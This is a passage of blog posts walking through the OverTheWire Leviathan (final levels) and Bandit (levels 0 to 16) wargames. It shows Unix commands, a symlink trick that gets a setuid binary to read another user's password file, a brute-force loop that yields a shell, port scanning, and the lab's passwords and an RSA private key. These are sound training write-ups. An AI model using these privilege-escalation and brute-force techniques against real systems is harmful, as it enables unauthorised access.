<p>Convert it to Ascii for the password: <code>Tith4cokei</code></p>

<h3>Level 5 &ndash;> Level 6</h3>

<p>Another binary! If you run it, it says it can&rsquo;t find a file:</p>

<p><code>plain
leviathan5@melinda:~$ ./leviathan5
Cannot find /tmp/file.log
</code></p>

<p>This is a setuid binary, so maybe we can trick it into reading the password file for the leviathan5 user. I made a symlink to the password file with the name of the missing file, and the binary followed it right to the password:</p>

<p><code>plain
leviathan5@melinda:~$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@melinda:~$ ./leviathan5
UgaoFee4li
</code></p>

<h3>Level 6 &ndash;> Level 7</h3>

<p>And yet another binary! This one asks for a 4-digit code:</p>

<p><code>plain
leviathan6@melinda:~$ ./leviathan6
usage: ./leviathan6 &lt;4 digit code&gt;
</code></p>

<p>Lookint at the strings, it seems this program will give us a shell if we can find the right code. I was going to use Python again but I found a quick and easy way to bruteforce the code with a very small Bash script:</p>

<p>``` bash</p>

<h1>!/bin/bash</h1>

<p>for i in {0000..9999}
do
echo &lsquo;Trying&rsquo; $i
~/leviathan6 $i
done
```</p>

<p>This script iterates over the range of possible codes and tries each of them as input for the leviathan6 binary:</p>

<p><code>plain
...
Trying 7122
Wrong
Trying 7123
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
ahy7MaeBo9
</code></p>

<h3>Level 7 &ndash;> Level 8</h3>

<p>This is the final level, as you can see from the congratulatory note:</p>

<p><code>plain
leviathan7@melinda:~$ ls
CONGRATULATIONS
leviathan7@melinda:~$ cat CONGRATULATIONS
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
</code></p>

<p>Better skip over that last line&hellip;</p>

<p>``` plain</p>

<hr />

<p>/ Tomorrow will be cancelled due to lack \
\ of interest.                           /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[OverTheWire: Bandit]]></title>
    <link href="http://chousensha.github.io/blog/2015/06/22/overthewire-bandit/"/>
    <updated>2015-06-22T13:11:18-04:00</updated>
    <id>http://chousensha.github.io/blog/2015/06/22/overthewire-bandit</id>
    <content type="html"><![CDATA[<p>I&rsquo;ve completed this and some other wargames before starting a blog, but I thought I should revisit them and do a proper walkthrough, and that would also help me organize my notes beyond one-liners that I no longer know what they were for :D So, going to start with Bandit, which is the most basic and beginner friendly of the OverTheWire wargames. You can look at each level&rsquo;s page for a list of commands that you may need to solve it and some additional reading material that might help in better understanding what&rsquo;s going on. I will also give <em>man</em> pages descriptions for the commands I&rsquo;ll use to complete the levels.</p>

<!-- more -->


<h3>Level 0</h3>

<p>The goal of this level is for you to log into the game using SSH. The host to which you need to connect is bandit.labs.overthewire.org. The username is bandit0 and the password is bandit0. Once logged in, go to the Level 1 page to find out how to beat Level 1.</p>

<h3>Level 0 &ndash;> Level 1</h3>

<p>The password for the next level is stored in a file called readme located in the home directory. Use this password to log into bandit1 using SSH. Whenever you find a password for a level, use SSH to log into that level and continue the game.</p>

<p>``` plain
ssh <a href="&#109;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#x62;&#97;&#x6e;&#x64;&#x69;&#x74;&#x30;&#x40;&#98;&#97;&#x6e;&#x64;&#105;&#x74;&#x2e;&#108;&#x61;&#98;&#x73;&#x2e;&#111;&#x76;&#x65;&#x72;&#116;&#x68;&#x65;&#x77;&#105;&#114;&#101;&#x2e;&#x6f;&#x72;&#103;">&#98;&#97;&#x6e;&#x64;&#x69;&#x74;&#x30;&#64;&#x62;&#97;&#x6e;&#x64;&#x69;&#x74;&#46;&#x6c;&#97;&#98;&#115;&#x2e;&#111;&#x76;&#x65;&#x72;&#x74;&#x68;&#x65;&#x77;&#105;&#x72;&#x65;&#x2e;&#x6f;&#x72;&#103;</a>
Welcome to the OverTheWire games machine !</p>

<p>Please read /README.txt for more information on how to play the levels
on this gameserver.</p>

<p>bandit0@melinda:~$ ls
readme
bandit0@melinda:~$ cat readme
boJ9jbbUNNfktd78OOpsqOltutMc3MY1
```</p>

<p>Well, this is straightforward. The required file just lies around for the reading</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>cat &ndash; concatenate files and print on the standard output</p></blockquote>

<h3>Level 1 &ndash;> Level 2</h3>

<p>The password for the next level is stored in a file called &ndash; located in the home directory</p>

<p>Although filenames starting with dashes are legal in Linux, if you try to use some commands on them, the dash would get confused with command flags. If you try to <em>cat</em> it directly, <em>cat</em> will just wait for further input. The workaround is to feed <em>cat</em> the path to the file (can also be done just by using the current directory path)</p>

<p>``` plain</p>

<h2>bandit1@melinda:~$ ls</h2>

<p>bandit1@melinda:~$ pwd
/home/bandit1
bandit1@melinda:~$ cat /home/bandit1/&ndash;
CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
```</p>

<h3>Level 2 &ndash;> Level 3</h3>

<p>The password for the next level is stored in a file called spaces in this filename located in the home directory</p>

<p>Spaces in filenames can be interpreted wrongly on the command line, because they may look as separators for the commands instead of literal spaces that are part of a filename, and this leads to all sorts of problems. That is why using spaces in filenames are generally avoided in Linux. If you try to <em>cat</em> the file as it is, this is what happens:</p>

<p><code>plain
bandit2@melinda:~$ ls
spaces in this filename
bandit2@melinda:~$ cat spaces in this filename
cat: spaces: No such file or directory
cat: in: No such file or directory
cat: this: No such file or directory
cat: filename: No such file or directory
</code></p>

<p>To solve the issue, you can either wrap the filenames in quotes or escape the spaces with backslashes, to ensure that the name of the file is passed correctly to the command (and if you use Tab completion, the shell will automatically escape them for you :D)</p>

<p><code>plain
bandit2@melinda:~$ cat 'spaces in this filename'
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
bandit2@melinda:~$ cat spaces\ in\ this\ filename
UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK
</code></p>

<h3>Level 3 &ndash;> Level 4</h3>

<p>The password for the next level is stored in a hidden file in the inhere directory.</p>

<p>If you do a normal <em>ls</em>, you won&rsquo;t see anything. To see hidden files, you use the <em>-a</em> option, which stands for <em>&mdash;all</em>:</p>

<p><code>plain
bandit3@melinda:~$ ls
inhere
bandit3@melinda:~$ cd inhere
bandit3@melinda:~/inhere$ ls -a
.  ..  .hidden
bandit3@melinda:~/inhere$ cat .hidden
pIwrPrtPN36QITSp3EQaw936yaFoFgAB
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>ls &ndash; list directory contents</p>

<p>-a, &mdash;all
do not ignore entries starting with .</p></blockquote>

<h3>Level 4 &ndash; Level 5</h3>

<p>The password for the next level is stored in the only human-readable file in the inhere directory. Tip: if your terminal is messed up, try the “reset” command.</p>

<p><code>plain
bandit4@melinda:~/inhere$ ls
-file00  -file02  -file04  -file06  -file08
-file01  -file03  -file05  -file07  -file09
bandit4@melinda:~/inhere$ cat ./-file00
;�-i�(��z��У��ޘ�鑾
</code></p>

<p>You can try to manually <em>cat</em> each of them, until you will reach the right one:</p>

<p><code>plain
bandit4@melinda:~/inhere$ cat ./-file07
koReBOKuIDDepwhWk7jZC0RTdopnAYKh
</code></p>

<p>But what if there were hundreds of files? If you use the <em>file</em> command, you can see the difference between the files:</p>

<p><code>plain
./-file00: data
./-file01: data
./-file02: data
./-file03: data
./-file04: data
./-file05: data
./-file06: data
./-file07: ASCII text
./-file08: data
./-file09: data
</code></p>

<p>Now you know which file to look in for the password!</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>file — determine file type</p></blockquote>

<h3>Level 5 &ndash;> Level 6</h3>

<p>The password for the next level is stored in a file somewhere under the inhere directory and has all of the following properties: &ndash; human-readable &ndash; 1033 bytes in size &ndash; not executable</p>

<p>Well, clearly no manual work here, the directory is filled with other folders:</p>

<p><code>plain
bandit5@melinda:~/inhere$ ls
maybehere00  maybehere04  maybehere08  maybehere12  maybehere16
maybehere01  maybehere05  maybehere09  maybehere13  maybehere17
maybehere02  maybehere06  maybehere10  maybehere14  maybehere18
maybehere03  maybehere07  maybehere11  maybehere15  maybehere19
</code></p>

<p>To find the file with the required properties, we can use..<em>find</em>! It conveniently has the exact switches for what we&rsquo;re looking for:</p>

<p><code>plain
bandit5@melinda:~/inhere$ find ! -executable -readable -size 1033c
./maybehere07/.file2
bandit5@melinda:~/inhere/maybehere07$ cat .file2
DXjZPULLxYr17uwoI01bNLQbtFemEgo7
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>find &ndash; search for files in a directory hierarchy</p>

<p>-executable
Matches files which are executable  and  directories  which  are searchable  (in  a file name resolution sense).</p>

<p>-readable
Matches  files  which  are  readable.</p>

<p>-size n
File uses n units of space.
`c'    for bytes</p></blockquote>

<h3>Level 6 &ndash;> Level 7</h3>

<p>The password for the next level is stored somewhere on the server and has all of the following properties: &ndash; owned by user bandit7 &ndash; owned by group bandit6 &ndash; 33 bytes in size</p>

<p>Again, <em>find</em> comes to the rescue!</p>

<p><code>plain
bandit6@melinda:~$ find / -user bandit7 -group bandit6 -size 33c 2&gt;/dev/null
/var/lib/dpkg/info/bandit7.password
bandit6@melinda:~$ cat /var/lib/dpkg/info/bandit7.password
HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>find</p>

<p>-user uname</p>

<p>File is owned by user uname (numeric user ID allowed).</p>

<p>-group gname</p>

<p>File belongs to group gname (numeric group ID allowed).</p></blockquote>

<h3>Level 7 &ndash;> Level 8</h3>

<p>The password for the next level is stored in the file data.txt next to the word millionth</p>

<p>We can use <em>grep</em> to get the line with the millionth word and our password:</p>

<p><code>plain
bandit7@melinda:~$ cat data.txt | grep millionth
millionth   cvX2JJa4CFALtqS87jk27qwqGhBM9plV
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>grep  searches the named input FILEs (or standard input if no files are
named, or if a single hyphen-minus (&ndash;) is given as file name) for lines
containing  a  match to the given PATTERN.  By default, grep prints the
matching lines.</p></blockquote>

<h3>Level 8 &ndash;> Level 9</h3>

<p>The password for the next level is stored in the file data.txt and is the only line of text that occurs only once</p>

<p>To get only the unique line(s), we will use some more pipe redirection:</p>

<p><code>plain
bandit8@melinda:~$ sort data.txt | uniq -u
UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>sort &ndash; sort lines of text files</p>

<p>uniq &ndash; report or omit repeated lines
-u, &mdash;unique
only print unique lines</p></blockquote>

<h3>Level 9 &ndash;> Level 10</h3>

<p>The password for the next level is stored in the file data.txt in one of the few human-readable strings, beginning with several ‘=’ characters.</p>

<p>For this one we can use <em>strings</em> and <em>grep</em> for the = sign:</p>

<p><code>plain
bandit9@melinda:~$ strings data.txt | grep =
epr~F=K
7?YD=
?M=HqAH
/(Ne=
C=_"
I========== the6
z5Y=
`h(8=`
n\H=;
========== password
========== ism
N$=&amp;
l/a=L)
f=C(
========== truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk
ie)=5e
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>strings &ndash; print the strings of printable characters in files.</p></blockquote>

<h3>Level 10 &ndash;> Level 11</h3>

<p>The password for the next level is stored in the file data.txt, which contains base64 encoded data</p>

<p>Luckily, there is a command-line utility just for that purpose!</p>

<p><code>plain
bandit10@melinda:~$ base64 -d data.txt
The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>base64 &ndash; base64 encode/decode data and print to standard output</p>

<p>-d, &mdash;decode
decode data</p></blockquote>

<h3>Level 11 &ndash;> Level 12</h3>

<p>The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions</p>

<p>If you read the ROT13 Implementation section on Wikipedia, it will actually give you a hint on how to solve this challenge and the program needed.</p>

<p><code>plain
bandit11@melinda:~$ cat data.txt | tr a-zA-Z n-za-mN-ZA-M
The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu
</code></p>

<p>Because the content of the file has been rotated 13 characters, we use the <em>tr</em> command to shift it back to the original</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>tr &ndash; translate or delete characters</p>

<p>CHAR1-CHAR2
all characters from CHAR1 to CHAR2 in ascending order</p></blockquote>

<h3>Level 12 &ndash;> Level 13</h3>

<p>The password for the next level is stored in the file data.txt, which is a hexdump of a file that has been repeatedly compressed. For this level it may be useful to create a directory under /tmp in which you can work using mkdir. For example: mkdir /tmp/myname123. Then copy the datafile using cp, and rename it using mv (read the manpages!)</p>

<p>If you <em>cat</em> data.txt this is what you will see:</p>

<p><code>plain
bandit12@melinda:~$ cat data.txt
0000000: 1f8b 0808 34da 6554 0203 6461 7461 322e  ....4.eT..data2.
0000010: 6269 6e00 013f 02c0 fd42 5a68 3931 4159  bin..?...BZh91AY
0000020: 2653 5982 c194 8a00 0019 ffff dbfb adfb  &amp;SY.............
0000030: bbab b7d7 ffea ffcd fff7 bfbf 1feb eff9  ................
0000040: faab 9fbf fef2 fefb bebf ffff b001 3b18  ..............;.
0000050: 6400 001e a000 1a00 6468 0d01 a064 d000  d.......dh...d..
0000060: 0d00 0034 00c9 a320 001a 0000 0d06 80d1  ...4... ........
0000070: a340 01b4 98d2 3d13 ca20 6803 40d1 a340  .@....=.. h.@..@
0000080: 1a00 0340 0d0d 0000 000d 0c80 6803 4d01  ...@........h.M.
0000090: a3d4 d034 07a8 0683 4d0c 4034 069e 91ea  ...4....M.@4....
00000a0: 0f50 1a1a 1ea3 40e9 ea0c 80d0 0346 87a9  .P....@......F..
00000b0: a006 8193 4340 d320 c403 2064 00c4 000c  ....C@. .. d....
00000c0: 8640 0d00 0d06 8340 0c9a 0068 0000 6468  .@.....@...h..dh
00000d0: 1854 0084 0008 38c4 7c28 66b3 bf1f 366d  .T....8.|(f...6m
00000e0: 3971 1c93 f09a 6287 0cfe 04d3 efa9 4164  9q....b.......Ad
00000f0: 0ad1 1828 6c55 75ff 6922 dedd 8cfe 5936  ...(lUu.i"....Y6
0000100: e351 7ae8 0590 6c01 0446 5f2a ba7e 8503  .Qz...l..F_*.~..
0000110: a710 a38c d8c1 9781 5249 b909 8d92 5e09  ........RI....^.
0000120: b343 32a1 9890 cc63 74f2 a3a1 f260 3afa  .C2....ct....`:.
0000130: 4f55 cc30 f7a3 5c20 d610 a588 1ab4 543c  OU.0..\ ......T&lt;
0000140: 71b3 d052 8980 010a b270 4112 89c4 ad7a  q..R.....pA....z
0000150: 8386 125d a460 3a11 3da3 4949 a01f 9e7d  ...].`:.=.II...}
0000160: 8f5e fef5 e13a 4537 dfb3 a898 92e8 cca0  .^...:E7........
0000170: 155c fb29 d0e1 08cf 0cec 7006 b1bc 8f39  .\.)......p....9
0000180: 51bc 1b7b e1ef 161f f020 6830 b1fd d69c  Q..{..... h0....
0000190: e096 54a1 1a03 47ce c4f1 00c7 e520 2e02  ..T...G...... ..
00001a0: 5577 63ac 3dc9 0f84 200a 745d 0503 f8f4  Uwc.=... .t]....
00001b0: b9fb 1152 1c22 a410 572e 11ac cf9e 5ff6  ...R."..W....._.
00001c0: dbf4 ef68 3010 7e36 026e aa38 19fd 4c37  ...h0.~6.n.8..L7
00001d0: 392c a262 f646 8710 9231 4ee4 5200 c601  9,.b.F...1N.R...
00001e0: 529a fec3 8c89 f85d 5f12 5c2f 9073 4544  R......]_.\/.sED
00001f0: 4fed fb97 a851 f831 cd9a 69d7 e80b 12b5  O....Q.1..i.....
0000200: fb37 ba20 86e9 92a7 78c5 5092 2bac 6269  .7. ....x.P.+.bi
0000210: 01c7 09a1 fda4 ef8b 7c14 1832 a30f db92  ........|..2....
0000220: d345 a9b4 de57 8996 4dc7 8ee8 b334 02b2  .E...W..M....4..
0000230: 8dc4 a6a6 08ea c285 d28c 9f60 6779 540a  ...........`gyT.
0000240: 2b97 5e3f f82c 1800 80f1 32b0 32d1 7724  +.^?.,....2.2.w$
0000250: 5385 0908 2c19 48a0 d123 d96f 3f02 0000  S...,.H..#.o?...
</code></p>

<p>So, if it&rsquo;s been repeatedly compressed, than repeatedly decompressing it should do the job (this actually took an annoying time of repetitions&hellip;am I repeating the repeat word too often? :D)</p>

<p><code>plain
bandit12@melinda:~$ mkdir /tmp/mystuff
bandit12@melinda:~$ cp data.txt /tmp/mystuff
bandit12@melinda:~$ cd /tmp/mystuff
</code></p>

<p>To reverse the hexdump we will use <em>xxd</em>:</p>

<p><code>plain
bandit12@melinda:/tmp/mystuff$ xxd -r data.txt &gt; newdata
</code></p>

<p>Now let&rsquo;s look at it (not literally, it&rsquo;s full of garbage):</p>

<p><code>plain
bandit12@melinda:/tmp/mystuff$ file newdata
newdata: gzip compressed data, was "data2.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
</code></p>

<p>So now we know the data file was previously a binary file and it&rsquo;s been compressed with <em>gzip</em>. This means we know how to decompress it. There are a couple ways to do it. If you want to use <em>gzip</em>, you have to rename the file with a <em>.gz</em> extension:</p>

<p><code>plain
bandit12@melinda:/tmp/mystuff$ mv newdata data2.gz
bandit12@melinda:/tmp/mystuff$ gzip -d data3.gz
bandit12@melinda:/tmp/mystuff$ file data3
data3: bzip2 compressed data, block size = 900k
</code></p>

<p>You can also use <em>zcat</em> directly on the file without adding any extension:</p>

<p><code>plain
bandit12@melinda:/tmp/mystuff$ zcat newdata &gt; data3
bandit12@melinda:/tmp/mystuff$ file data3
data3: bzip2 compressed data, block size = 900k
</code></p>

<p>Since we know the program used to compress it, we use the same for the reverse:</p>

<p><code>plain
bandit12@melinda:/tmp/mystuff$ bzip2 -d data3
bzip2: Can't guess original name for data3 -- using data3.out
bandit12@melinda:/tmp/mystuff$ file data3.out
data3.out: gzip compressed data, was "data4.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
</code></p>

<p>We&rsquo;ve been through this kind of decompression before:</p>

<p><code>plain
bandit12@melinda:/tmp/mystuff$ zcat data3.out &gt; data5
bandit12@melinda:/tmp/mystuff$ file data5
data5: POSIX tar archive (GNU)
</code></p>

<p>Next we have a tar archive and we will just loop decompressions until we&rsquo;re done:</p>

<p><code>plain
bandit12@melinda:/tmp/mystuff$ tar xvf data5
data5.bin
bandit12@melinda:/tmp/mystuff$ file data5.bin
data5.bin: POSIX tar archive (GNU)
bandit12@melinda:/tmp/mystuff$ tar xvf data5.bin
data6.bin
bandit12@melinda:/tmp/mystuff$ file data6.bin
data6.bin: bzip2 compressed data, block size = 900k
bandit12@melinda:/tmp/mystuff$ bzip2 -d data6.bin
bzip2: Can't guess original name for data6.bin -- using data6.bin.out
bandit12@melinda:/tmp/mystuff$ file data6.bin.out
data6.bin.out: POSIX tar archive (GNU)
bandit12@melinda:/tmp/mystuff$ tar xvf data6.bin.out
data8.bin
bandit12@melinda:/tmp/mystuff$ file data8.bin
data8.bin: gzip compressed data, was "data9.bin", from Unix, last modified: Fri Nov 14 10:32:20 2014, max compression
bandit12@melinda:/tmp/mystuff$ zcat data8.bin &gt; data9
bandit12@melinda:/tmp/mystuff$ file data9
data9: ASCII text
bandit12@melinda:/tmp/mystuff$ cat data9
The password is 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL
</code></p>

<p>Finally! Had enough decompressions for one day.</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>xxd &ndash; make a hexdump or do the reverse.</p>

<p>-r | -revert</p>

<p>reverse operation: convert (or patch) hexdump into binary. If not writing to stdout, xxd writes into its output file without truncating it.</p>

<p>mv &ndash; move (rename) files</p>

<p>gzip &ndash; compress or expand files. Whenever possible, each file is replaced by one with the extension .gz. By default, gzip keeps the original file
name and timestamp in the compressed  file. Compressed files can be restored to their original form using gzip -d  or gunzip or zcat.</p>

<p>-d &mdash;decompress &mdash;uncompress
Decompress.</p>

<p>zcat uncompresses either a list of files on the command line or its standard input and writes the uncompressed data on standard output. zcat will
uncompress files that have the correct magic number whether they have a .gz suffix or not.</p>

<p>bzip2 &ndash; a block-sorting file compressor</p>

<p>bzip2 expects a list of file names to accompany the command-line flags. Each  file is replaced by a compressed version of itself, with the name
&ldquo;original_name.bz2&rdquo;.</p>

<p>If  the  file does not end in one of the recognised endings, .bz2, .bz, .tbz2 or .tbz, bzip2 complains that it cannot guess the name  of the
original file, and uses the original name with .out appended.</p>

<p>-d &mdash;decompress
Force  decompression.</p>

<p>Tar stores and extracts files from a tape or disk archive.</p>

<p>-x, &mdash;extract, &mdash;get
extract files from an archive</p>

<p>-v, &mdash;verbose
verbosely list files processed</p>

<p>-f, &mdash;file ARCHIVE
use archive file or device ARCHIVE</p></blockquote>

<h3>Level 13 &ndash;> Level 14</h3>

<p>The password for the next level is stored in /etc/bandit_pass/bandit14 and can only be read by user bandit14. For this level, you don’t get the next password, but you get a private SSH key that can be used to log into the next level. Note: localhost is a hostname that refers to the machine you are working on</p>

<p>Ok, we have a private key:</p>

<p><code>plain
bandit13@melinda:~$ ls
sshkey.private
bandit13@melinda:~$ file sshkey.private
sshkey.private: PEM RSA private key
</code></p>

<p>The description hinted that we need to use the private key to SSH as bandit14 and read the password, and also mentioned localhost. So let&rsquo;s ssh to localhost:</p>

<p><code>plain
ssh bandit14@localhost -i /home/bandit13/sshkey.private
bandit14@melinda:~$ cat /etc/bandit_pass/bandit14
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>ssh — OpenSSH SSH client (remote login program)</p>

<p>-i identity_file
Selects a file from which the identity (private key) for public key authentication is read.</p></blockquote>

<h3>Level 14 &ndash;> Level 15</h3>

<p>The password for the next level can be retrieved by submitting the password of the current level to port 30000 on localhost.</p>

<p>This level is straightforward since we have netcat available:</p>

<p><code>plain
bandit14@melinda:~$ nc -v localhost 30000
Connection to localhost 30000 port [tcp/*] succeeded!
4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e
Correct!
BfMYroe26WYalil77FoDi9qh59eK5xNr
</code></p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>The nc (or netcat) utility is used for just about anything under the sun involving TCP, UDP, or UNIX-domain sockets.  It can open TCP connections,
send UDP packets, listen on arbitrary TCP and UDP ports, do port scanning, and deal with both IPv4 and IPv6.</p></blockquote>

<h3>Level 15 &ndash;> Level 16</h3>

<p>The password for the next level can be retrieved by submitting the password of the current level to port 30001 on localhost using SSL encryption.</p>

<p>Helpful note: Getting “HEARTBEATING” and “Read R BLOCK”? Use -quiet and read the “CONNECTED COMMANDS” section in the manpage. Next to ‘R’ and ‘Q’, the ‘B’ command also works in this version of that command…</p>

<p>For this the <em>openssl</em> command line utility will come in handy:</p>

<p>``` plain
The openssl program is a command line tool for using the various cryptography functions of OpenSSL&rsquo;s crypto library from the shell. It can be used for</p>

<pre><code>    o  Creation and management of private keys, public keys and parameters
    o  Public key cryptographic operations
    o  Creation of X.509 certificates, CSRs and CRLs
    o  Calculation of Message Digests
    o  Encryption and Decryption with Ciphers
    o  SSL/TLS Client and Server Tests
    o  Handling of S/MIME signed or encrypted mail
    o  Time Stamp requests, generation and verification
</code></pre>

<p>```</p>

<p>In particular, we will use the <code>s_client</code> command which is very useful for SSL servers testing and diagnostics. We use it to connect to localhost on the specified port:</p>

<p>``` plain
bandit15@melinda:~$ openssl s_client -quiet -connect localhost:30001
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
BfMYroe26WYalil77FoDi9qh59eK5xNr
Correct!
cluFn7wTiGryunymYOu4RcffSxQluehd</p>

<p>read:errno=0
```</p>

<p>Without the <em>-quiet</em> flag we would get a ton of information and instead of the password we would see some HEARTBEATING and read R BLOCK messages</p>

<p><strong>Useful command(s)</strong></p>

<blockquote><p>openssl &ndash; OpenSSL command line tool</p>

<p>s_client  This implements a generic SSL/TLS client which can establish a transparent connection to a remote server speaking SSL/TLS.
It&rsquo;s intended for testing purposes only and provides only rudimentary interface functionality but internally uses
mostly all functionality of the OpenSSL ssl library.</p>

<p>-connect host:port
This specifies the host and optional port to connect to. If not specified then an attempt is made to connect to the local host on port 4433</p>

<p>-quiet
inhibit printing of session and certificate information. This implicitly turns on -ign_eof as well.</p></blockquote>

<p>More information (along with the CONNECTED COMMANDS section) can be found on <a href="https://openssl.org/docs/apps/s_client.html#options">https://openssl.org/docs/apps/s_client.html#options</a></p>

<h3>Level 16 &ndash;> Level 17</h3>

<p>The password for the next level can be retrieved by submitting the password of the current level to a port on localhost in the range 31000 to 32000. First find out which of these ports have a server listening on them. Then find out which of those speak SSL and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.</p>

<p>Fortunately, we have nmap installed, so scanning the port range is easy!</p>

<p>``` plain
bandit16@melinda:~$ nmap localhost -p31000-32000</p>

<p>Starting Nmap 6.40 ( <a href="http://nmap.org">http://nmap.org</a> ) at 2015-07-27 13:56 UTC
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00087s latency).
Not shown: 996 closed ports
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown</p>

<p>Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds
```</p>

<p>Using netcat to probe all those ports, I found out that ports 31518 and 31790 use SSL from the following error:</p>

<p><code>plain
ERROR
140737354045088:error:1408F10B:SSL routines:SSL3_GET_RECORD:wrong version number:s3_pkt.c:350:
</code></p>

<p>The rest of the ports just echo back what you send them. So now let&rsquo;s feed the password to these ports and see which one will give the answer:</p>

<p><code>plain
bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31518
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
cluFn7wTiGryunymYOu4RcffSxQluehd
</code></p>

<p>So, port 31518 just returns the string you give it. Must be the other one:</p>

<p>``` plain
bandit16@melinda:~$ openssl s_client -quiet -connect localhost:31790
depth=0 CN = li190-250.members.linode.com
verify error:num=18:self signed certificate
verify return:1
depth=0 CN = li190-250.members.linode.com
verify return:1
cluFn7wTiGryunymYOu4RcffSxQluehd
Correct!
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
MIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ
imZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ
Ja6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu
DSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW
JGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX
x0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD
KHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl
J9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd
d8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC
YNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A
vLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama
+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT
8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx
SatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd
HCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt
SghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A
R57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi
Ttiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg
R8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu
L8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni
blh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU
YOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM
77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b
dxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3
vBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;</p>

<p>read:errno=0
```</p>

<p>Instead of a password we got a SSH private key. I copied it in my <code>.ssh</code> folder, gave it right permissions to stop the WARNING: UNPROTECTED PRIVATE KEY FILE! message, and used it to log in as the next level and get the password:</p>

